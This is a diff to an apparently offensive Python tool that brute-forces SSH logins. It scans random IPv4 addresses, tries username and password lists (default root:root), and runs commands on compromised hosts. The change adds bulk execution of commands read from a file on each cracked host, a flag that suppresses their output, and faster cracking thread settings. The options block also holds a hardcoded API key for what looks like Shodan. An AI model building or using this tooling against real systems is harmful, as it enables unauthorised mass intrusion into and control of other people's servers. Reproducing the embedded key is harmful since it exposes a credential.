@@ -98,15 +98,17 @@ HELP = BOLD + '''usage''' + NORM + '''
 
   -r <num>              - generate <num> random ipv4 addresses, check for open
                           sshd port and crack for login (only with -m option!)
-  -c <cmd>              - execute this <cmd> on host if login was cracked
+  -c <file|cmd>         - read commands from file (line by line) or execute a
+                          single command on host if login was cracked
+  -N                    - do not output ssh command results
   -u <user>             - single username (default: root)
   -U <file>             - list of usernames
   -p                    - single password (default: root)
   -P <file>             - list of passwords
   -C <file>             - list of user:pass combination
-  -x <num>              - num threads for parallel host crack (default: 20)
-  -S <num>              - num threads for parallel service crack (default: 20)
-  -X <num>              - num threads for parallel login crack (default: 20)
+  -x <num>              - num threads for parallel host crack (default: 50)
+  -S <num>              - num threads for parallel service crack (default: 1)
+  -X <num>              - num threads for parallel login crack (default: 5)
   -B <num>              - num threads for parallel banner grabbing (default: 70)
   -T <sec>              - num sec for auth and connect timeout (default: 5s)
   -R <sec>              - num sec for (banner) read timeout (default: 3s)
@@ -154,11 +156,12 @@ opts = {
   'sho_lim': None,
   'sho_key': 'Pp1oDSiavzKQJSsRgdzuxFJs8PQXzBL9',
   'cmd': None,
+  'cmd_no_out': False,
   'user': 'root',
   'pass': 'root',
-  'hthreads': 20,
-  'sthreads': 20,
-  'lthreads': 20,
+  'hthreads': 50,
+  'sthreads': 1,
+  'lthreads': 5,
   'bthreads': 70,
   'ctimeout': 5,
   'rtimeout': 3,
@@ -223,7 +226,7 @@ def parse_cmdline(cmdline):
 
   try:
     _opts, _args = getopt.getopt(cmdline,
-      'h:l:m:s:b:r:c:u:U:p:P:C:x:S:X:B:T:R:o:evVH')
+      'h:l:m:s:b:r:c:N:u:U:p:P:C:x:S:X:B:T:R:o:evVH')
     for o, a in _opts:
       if o == '-h':
         opts['targets'] = parse_target(a)
@@ -239,6 +242,8 @@ def parse_cmdline(cmdline):
         opts['random'] = int(a)
       if o == '-c':
         opts['cmd'] = a
+      if o == '-N':
+        opts['cmd_no_out'] = True
       if o == '-u':
         opts['user'] = a
       if o == '-U':
@@ -405,11 +410,25 @@ def crack_login(host, port, username, password):
       else:
         log(f'found a login (check {opts["logfile"]})', _type='good')
       if opts['cmd']:
-        log('sending your ssh command', 'info')
-        stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
-        log('ssh command results', 'good')
-        for line in stdout.readlines():
-          log(line)
+        if os.path.isfile(opts['cmd']):
+          log(f"sending ssh commands from {opts['cmd']}", 'info')
+          with open(opts['cmd'], 'r', encoding='latin-1') as _file:
+            for line in _file:
+              stdin, stdout, stderr = cli.exec_command(line, timeout=2)
+              if not opts['cmd_no_out']:
+                rl = stdout.readlines()
+                if len(rl) > 0:
+                  log(f'ssh command result for: \'{line.rstrip()}\'', 'good',
+                    pre_esc='\n')
+                  for line in rl:
+                    log(f'{line}')
+        else:
+          log('sending your single ssh command line', 'info')
+          if not opts['cmd_no_out']:
+            stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
+            log(f"ssh command results for \'{opts['cmd'].rstrip()}\'", 'good')
+            for line in stdout.readlines():
+              log(line)
       return SUCCESS
   except paramiko.AuthenticationException as err:
     if opts['verbose']:
@@ -463,6 +482,7 @@ def run_threads(host, ports, val='single'):
 
       if 'userlist' in opts and 'passlist' in opts:
         for u in uf:
+          pf = open(opts['passlist'], 'r', encoding='latin-1')
           for p in pf:
             exe.submit(crack_login, host, port, u.rstrip(), p.rstrip())
 
